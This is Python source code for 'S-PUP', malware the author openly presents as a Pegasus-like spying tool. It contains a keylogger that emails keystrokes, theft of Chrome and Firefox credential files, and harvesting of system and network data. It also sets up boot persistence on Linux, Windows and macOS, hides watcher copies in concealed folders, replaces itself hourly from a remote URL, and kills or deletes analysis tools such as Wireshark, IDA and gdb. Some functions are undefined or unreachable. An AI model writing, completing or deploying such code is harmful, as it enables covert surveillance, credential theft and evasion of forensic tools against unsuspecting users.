# From nothing we make everything
# From nothing we make everything
# From nothing we make everything
# SHARK PUP
# SHARK PUP
# SHARK PUP
# S-PUP
# S-PUP
# S-PUP
# By Anas Labrini

#S-PUP is an advanced, sophisticated, and intelligent malware developed by Anas Labrini. When the malware enters a system, whether Linux, Windows, or Mac OS, it spreads through five hidden paths that are difficult for the average user or even someone with average experience to access. After spreading, it installs itself in the autorun path when the system restarts, ensuring that the malware runs when the system boots. Each time the system boots, a notification is sent to an email or Telegram bot. The notification contains information about the system, such as system information: device name, system type, system version, processor type, number of cores, architecture, space, and current user. It also collects network information, such as: local and external IP addresses, MAC addresses, the name of the connected Wi-Fi network, the network interface and associated IPs, open TCP/UDP connections via netstat, devices connected to the same network, and information about files and applications, such as: a list of files in Desktop, Downloads, and Documents; a list of all installed programs on the system; and sensitive paths such as .ssh and AppData. Etc.
#Also, passwords and stored information, such as extracting passwords from Chrome, Firefox, and Wi-Fi passwords. After all this, it checks the system to see if it contains advanced protection programs or digital forensics programs, for example, Wireshark, Process Hacker, IDA Pro, Frida, GDB, and stops the processes associated with them or makes them not work silently without raising suspicion, and if necessary, deletes them from the system. Then it starts recording keystrokes every 50 clicks. The information is sent to an email or a Telegram bot. Now we are talking about Persistence. It creates 5 copies whose role is to monitor it. If the program is stopped or deleted, it is immediately restored. These five are in different hidden paths, and each one of them monitors the program. For example, there is a leader and five guards. If the leader falls, the leadership is taken over by one of the guards to replace the leader and revive or operate him. This means that it is difficult to delete him because the guards monitor the leader every 60 minutes to see if he is working or present. In addition to the automatic update, it updates itself every 60 minutes from the warehouse and makes sure there is any update, and if it finds an update, it replaces itself. This allows us to install a backdoor and gain remote control, meaning the ability to expand the scope of the attack.
#Here, we touch on an important point: the software runs on systems in py format, making it undetectable and difficult to monitor its activity during the download process. This solves the protection by setting up portable python for each system type, so that it comes with a modern Python environment with the libraries required by the software. This avoids problems such as Python not being properly configured on the system. For example, if we want to target Windows, we develop a script in vbs format that creates a PowerShell script and runs it silently, without interruptions or interference. It checks the system type to download the appropriate portable python. The software is then downloaded and executed. Once executed, the script confirms that the software has run successfully and that the guards are in place. It removes itself from the system, all in complete silence.
#Currently, the software is still receiving updates. I will add several highly advanced features and technologies in the future to make it a true copy of Pegasus.
#Anas Labrini



import os
import platform
import threading
import time
import datetime
import requests
from pynput import keyboard
import smtplib
from email.message import EmailMessage
import socket
import subprocess
import shutil
import sys
import sqlite3
import psutil
import getpass
import tempfile

is_watcher = "--watcher" in sys.argv

# ===== إعدادات البريد =====
EMAIL_ADDRESS = "default_email"
EMAIL_PASSWORD = "default_password"
TO_EMAIL = "default_receiver"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

# ===== إعدادات النظام والسجل =====
os_info = platform.system()
log_file = "keylogs.txt"
buffer = []
buffer_limit = 50
update_url = "https://raw.githubusercontent.com/anaslabrini/S-PUP/refs/heads/main/tool/S-PUP.py"  # رابط التحديث المباشر للسكريبت

# ===== تحويل المفاتيح الخاصة إلى نصوص بشرية =====
key_mapping = {
    'Key.space': '[SPACE]',
    'Key.enter': '[ENTER]',
    'Key.tab': '[TAB]',
    'Key.backspace': '[BACKSPACE]',
    'Key.shift': '[SHIFT]',
    'Key.ctrl_l': '[CTRL]',
    'Key.ctrl_r': '[CTRL]',
    'Key.alt_l': '[ALT]',
    'Key.alt_r': '[ALT]',
    'Key.esc': '[ESC]',
    'Key.caps_lock': '[CAPS LOCK]',
    'Key.num_lock': '[NUM LOCK]',
    'Key.scroll_lock': '[SCROLL LOCK]',
    'Key.f1': '[F1]', 'Key.f2': '[F2]', 'Key.f3': '[F3]', 'Key.f4': '[F4]', 'Key.f5': '[F5]',
    'Key.f6': '[F6]', 'Key.f7': '[F7]', 'Key.f8': '[F8]', 'Key.f9': '[F9]', 'Key.f10': '[F10]',
    'Key.f11': '[F11]', 'Key.f12': '[F12]',
}

# ===== إرسال البريد =====
# ===== إرسال البريد =====
def send_email(subject, content):
    try:
        msg = EmailMessage()
        msg['Subject'] = subject
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = TO_EMAIL
        msg.set_content(content)

        # استخدام التوقيت الحالي في اسم الملف
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        log_filename = f'keylogs_{timestamp}.txt'

        with open(log_filename, 'w') as f:
            f.write(content)

        with open(log_filename, 'rb') as f:
            msg.add_attachment(f.read(), maintype='text', subtype='plain', filename=log_filename)

        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as smtp:
            smtp.starttls()
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            smtp.send_message(msg)

        os.remove(log_filename)
        print(f"[+] Email sent with log file: {log_filename}")

    except Exception as e:
        print(f"[-] Email error: {e}")


# ===== إرسال إشعار بدء التشغيل =====
def send_startup_info():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)

        # IP الخارجي
        try:
            external_ip = requests.get('https://api.ipify.org').text
        except Exception:
            external_ip = "Unable to fetch external IP"

        # معلومات النظام
        system_info = f"""
        ===== System Information =====
        System: {platform.system()} {platform.release()} {platform.version()}
        Architecture: {platform.machine()}
        Hostname: {hostname}
        Username: {os.getlogin()}
        Language: {os.getenv('LANG', 'Unknown')}
        Internal IP: {local_ip}
        External IP: {external_ip}
        """

        # عنوان MAC
        try:
            mac_address = ':'.join(['{:02x}'.format((os.getnode() >> i) & 0xff) for i in range(0, 8 * 6, 8)][::-1])
        except Exception:
            mac_address = "Unable to fetch MAC address"

        system_info += f"\nMAC Address: {mac_address}\n"

        # الشبكات اللاسلكية المتاحة (لأنظمة Linux فقط)
        if platform.system() == "Linux":
            try:
                networks = subprocess.getoutput("nmcli dev wifi")
                system_info += f"\n===== Available Networks =====\n{networks}\n"
            except Exception:
                system_info += "\nUnable to fetch wireless networks\n"

        # العمليات النشطة
        try:
            processes = subprocess.getoutput("ps -ef")
            system_info += f"\n===== Active Processes =====\n{processes}\n"
        except Exception:
            system_info += "\nUnable to fetch processes\n"

        # البرامج المثبتة
        try:
            if platform.system() == "Linux":
                installed_programs = subprocess.getoutput("dpkg -l")
            elif platform.system() == "Windows":
                installed_programs = subprocess.getoutput("wmic product get name,version")
            else:
                installed_programs = "Unable to fetch installed programs on this OS."

            system_info += f"\n===== Installed Programs =====\n{installed_programs}\n"
        except Exception:
            system_info += "\nUnable to fetch installed programs\n"

        # الملفات في مجلد Desktop و Downloads
        try:
            desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
            downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")

            desktop_files = os.listdir(desktop_path) if os.path.exists(desktop_path) else []
            downloads_files = os.listdir(downloads_path) if os.path.exists(downloads_path) else []

            system_info += f"\n===== Desktop Files =====\n{', '.join(desktop_files)}\n"
            system_info += f"\n===== Downloads Files =====\n{', '.join(downloads_files)}\n"

        except Exception:
            system_info += "\nUnable to fetch Desktop/Downloads files\n"

        # الاتصالات المفتوحة
        try:
            connections = subprocess.getoutput("netstat -tulnp")
            system_info += f"\n===== Active Connections =====\n{connections}\n"
        except Exception:
            system_info += "\nUnable to fetch network connections\n"
        # ملفات كلمات المرور من المتصفحات
        files_to_attach = []
        tmp_dir = tempfile.gettempdir()

        def safe_copy(path, label):
            if os.path.exists(path):
                try:
                    dest = os.path.join(tmp_dir, f"{label.replace(' ', '_')}_{os.path.basename(path)}")
                    shutil.copy2(path, dest)
                    files_to_attach.append(dest)
                except:
                    pass

        system = platform.system()
        home = os.path.expanduser("~")

        if system == "Windows":
            chrome = os.path.join(home, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
            local_state = os.path.join(home, "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
            firefox = os.path.join(home, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
        elif system == "Linux":
            chrome = os.path.join(home, ".config", "google-chrome", "Default", "Login Data")
            local_state = os.path.join(home, ".config", "google-chrome", "Local State")
            firefox = os.path.join(home, ".mozilla", "firefox")
        elif system == "Darwin":
            chrome = os.path.join(home, "Library", "Application Support", "Google", "Chrome", "Default", "Login Data")
            local_state = os.path.join(home, "Library", "Application Support", "Google", "Chrome", "Local State")
            firefox = os.path.join(home, "Library", "Application Support", "Firefox", "Profiles")
        else:
            chrome = local_state = firefox = None

        # Chrome
        safe_copy(chrome, "Chrome Login Data")
        safe_copy(local_state, "Chrome Local State")
        chrome_passwords = ""
        if os.path.exists(chrome) and os.path.exists(local_state):
            chrome_passwords = extract_chrome_passwords(chrome, local_state)
            system_info += f"\n{chrome_passwords}\n"


        # Firefox
        if firefox and os.path.exists(firefox):
            for root, dirs, files in os.walk(firefox):
                for file in files:
                    if file in ["logins.json", "key4.db"]:
                        safe_copy(os.path.join(root, file), f"Firefox_{file}")

        # إرسال التقرير عبر البريد الإلكتروني
        send_email("Advanced System Startup Notification", system_info)

    except Exception as e:
        print(f"[-] Error sending startup info: {e}")


# ===== تحديث السكربت =====
def update_script():
    try:
        response = requests.get(update_url, timeout=10)
        if response.status_code == 200:
            with open(__file__, 'w') as f:
                f.write(response.text)
            print("[+] Script updated successfully.")
        else:
            print(f"[-] Failed to download update. Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Update error: {e}")

# ===== التقاط الضغطات =====
def on_press(key):
    try:
        key_text = str(key.char) if hasattr(key, 'char') else str(key)
        if key_text in key_mapping:
            key_text = key_mapping[key_text]
    except:
        key_text = str(key)

    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_line = f"[{timestamp}] {key_text}"
    buffer.append(log_line)

    if len(buffer) >= buffer_limit:
        with open(log_file, 'a') as f:
            f.write('\n'.join(buffer) + '\n')
        send_email("S-PUP Report", '\n'.join(buffer))
        buffer.clear()

# ===== بدء تشغيل اللوجر =====
def start_logger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# ===== حفظ البرنامج في الخلفية =====

def persist_script(output_filename):
    system = platform.system()

    if system == "Linux":
        print("[*] System: Linux - Setting up systemd service...")

        user_service_path = os.path.expanduser("~/.config/systemd/user")
        os.makedirs(user_service_path, exist_ok=True)

        # اسم الخدمة بناءً على اسم الملف
        service_name = os.path.splitext(output_filename)[0] + ".service"
        service_file_path = os.path.join(user_service_path, service_name)

        # المسار الكامل للسكربت
        script_path = os.path.abspath(output_filename)


        service_content = f"""[Unit]
Description=S-PUP Persistence Service for {output_filename}
After=network.target

[Service]
Type=simple
WorkingDirectory={os.path.dirname(script_path)}
ExecStart=/usr/bin/python3 {script_path}
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
"""

        # إنشاء ملف الخدمة
        with open(service_file_path, 'w') as f:
            f.write(service_content)

        print(f"[+] Service created: {service_file_path}")

        # إعادة تحميل الخدمات الخاصة بالمستخدم
        subprocess.run(["systemctl", "--user", "daemon-reload"])

        # تفعيل وتشغيل الخدمة
        subprocess.run(["systemctl", "--user", "enable", service_name])
        subprocess.run(["systemctl", "--user", "start", service_name])

        print(f"[+] Service {service_name} enabled and started.")
        
        filename = os.path.abspath(__file__)
        basename = os.path.basename(filename)

    # قائمة مسارات خفية لا تحتاج صلاحيات root وتوجد دائمًا في أنظمة Linux
        hidden_paths = [
            os.path.expanduser("~/.config/.cache/"),
            os.path.expanduser("~/.local/share/.logs/"),
            os.path.expanduser("~/.cache/.updates/"),
            os.path.expanduser("~/.mozilla/.backup/"),
            os.path.expanduser("~/.gnupg/.daemon/"),
        ]

        for path in hidden_paths:
            try:
                os.makedirs(path, exist_ok=True)
                target_file = os.path.join(path, basename)
                if not os.path.isfile(target_file):
                    shutil.copy2(filename, target_file)
                    print(f"[+] Script copied to: {target_file}")
            except Exception as e:
                print(f"[-] Error copying to {path}: {e}")

    
    #  ( حراس ) إطلاق النسخ الاحتياطية كمراقبين فقط
        def launch_backup_watchers(hidden_paths):
            for path in hidden_paths:
                target = os.path.join(path, os.path.basename(__file__))
                if os.path.isfile(target):
                    subprocess.Popen(["/usr/bin/python3", target, "--watcher"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        def watch_primary_script():
            while True:
                if not os.path.isfile(script_path):
                    print("[!] Primary script missing. Promoting self to primary...")
                    try:
                # نسخ نفسه إلى مكان السكربت الأصلي
                        shutil.copy2(__file__, script_path)

                # إعادة تفعيل الخدمة
                        subprocess.run(["systemctl", "--user", "enable", service_name])
                        subprocess.run(["systemctl", "--user", "start", service_name])
                        print("[+] Recovery completed by watcher.")

                        break  # توقف بعد النجاح
                    except Exception as e:
                        print(f"[-] Recovery failed: {e}")

                time.sleep(60)  # راقب كل دقيقة

                

    elif system == "Windows":
        print("[*] System: Windows - Setting up Startup script...")
        startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        target_path = os.path.join(startup_folder, f"{output_filename}.bat")
        with open(target_path, 'w') as f:
            pythonw_path = shutil.which("pythonw") or "python"
            f.write(f"@echo off\nstart {pythonw_path} {os.path.abspath(output_filename)}\n")

    elif system == "Darwin":
        print("[*] System: macOS - Setting up Launch Agent...")
        launch_agents_path = os.path.expanduser("~/Library/LaunchAgents")
        os.makedirs(launch_agents_path, exist_ok=True)

        plist_file_path = os.path.join(launch_agents_path, f"com.{os.path.splitext(output_filename)[0]}.plist")

        plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
        <dict>
            <key>Label</key>
            <string>com.{os.path.splitext(output_filename)[0]}</string>
            <key>ProgramArguments</key>
            <array>
                <string>/usr/bin/python3</string>
                <string>{os.path.abspath(output_filename)}</string>
            </array>
            <key>RunAtLoad</key>
            <true/>
        </dict>
        </plist>
        """

        with open(plist_file_path, 'w') as f:
            f.write(plist_content)

        # تحميل الـ plist لتشغيله فورًا
        subprocess.run(["launchctl", "load", plist_file_path])

        print(f"[+] Launch Agent created: {plist_file_path}")
        try:
            subprocess.run(["launchctl", "load", plist_file_path], check=True)
        except subprocess.CalledProcessError:
            print("[!] Failed to load LaunchAgent. Check permissions or SIP settings.")


def is_admin():
    try:
        if os.name == 'nt':
            # Windows
            return os.getuid() == 0 if hasattr(os, "getuid") else ctypes.windll.shell32.IsUserAnAdmin()
        else:
            # Linux/macOS
            return os.getuid() == 0
    except:
        return False

def kill_if_running(proc_name):
    for proc in psutil.process_iter(['name', 'pid']):
        try:
            if proc_name.lower() in proc.info['name'].lower():
                print(f"[!] Found: {proc.info['name']} (PID: {proc.info['pid']})")
                try:
                    proc.kill()
                    print(f"[+] Killed {proc.info['name']}")
                except psutil.AccessDenied:
                    print(f"[-] Access denied to kill {proc.info['name']} - Skipping")
                except Exception as e:
                    print(f"[-] Error killing {proc.info['name']}: {e}")
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

def delete_app_if_possible(app_path):
    if os.path.exists(app_path):
        try:
            if os.access(app_path, os.W_OK):
                if os.path.isdir(app_path):
                    shutil.rmtree(app_path)
                else:
                    os.remove(app_path)
                print(f"[+] Removed app: {app_path}")
            else:
                print(f"[-] No permission to delete {app_path}")
        except Exception as e:
            print(f"[-] Failed to delete {app_path}: {e}")

def detect_and_block_tools():
    system = platform.system()
    current_user = getpass.getuser()
    is_root = is_admin()
    print(f"[*] OS Detected: {system} | User: {current_user} | Root/Admin: {is_root}")

    # 🔎 أدوات مراقبة وتحليل شائعة
    suspicious_processes = [
        "wireshark", "tcpdump", "fiddler", "procmon", "processhacker",
        "ollydbg", "x64dbg", "ida64", "ida", "regshot", "dumpcap",
        "sandboxie", "vboxservice", "vboxtray", "vmtoolsd", "vmwaretray",
        "frida-server", "frida", "gdb", "strace", "ltrace", "radare2",
        "ghidra", "volatility", "sleuthkit", "autopsy"
    ]

    # 🔐 مسارات شائعة لحذف الأدوات (إذا ممكن)
    known_paths = {
        "Windows": [
            "C:\\Program Files\\Wireshark\\",
            "C:\\Program Files\\Process Hacker 2\\",
            "C:\\Program Files\\IDA Pro\\"
        ],
        "Linux": [
            "/usr/bin/wireshark", "/usr/bin/ida64", "/usr/bin/gdb"
        ],
        "Darwin": [  # macOS
            "/Applications/Wireshark.app/",
            "/Applications/IDA Pro.app/",
        ]
    }

    print("[*] Searching for known processes...")
    for proc in suspicious_processes:
        kill_if_running(proc)

    print("[*] Attempting to delete known app paths (if accessible)...")
    for path in known_paths.get(system, []):
        delete_app_if_possible(path)

    print("[+] Anti-analysis operations completed.\n")

# ===== تشغيل البرنامج بشكل دائم =====
def run_every_hour():
    while True:
        time.sleep(3600)
        update_script()  # تحديث السكربت كل ساعة

# ===== تشغيل السكربت =====
if __name__ == "__main__":
    if is_watcher:
        print("[*] Running in watcher mode...")
        watch_primary_script()
    else:
        print("[*] Running as primary script...")

        # 1. تثبيت السكربت كخدمة تعمل عند الإقلاع
        persist_script(os.path.basename(__file__))


        # 3. بدء تسجيل المفاتيح في الخلفية
        threading.Thread(target=start_logger, daemon=True).start()

        # 4. إرسال معلومات التشغيل
        send_startup_info()

        # 5. تحديث السكربت عند البداية
        update_script()

        # 6. تحديث السكربت كل ساعة بشكل مستمر
        run_every_hour()
        
        detect_and_block_tools()
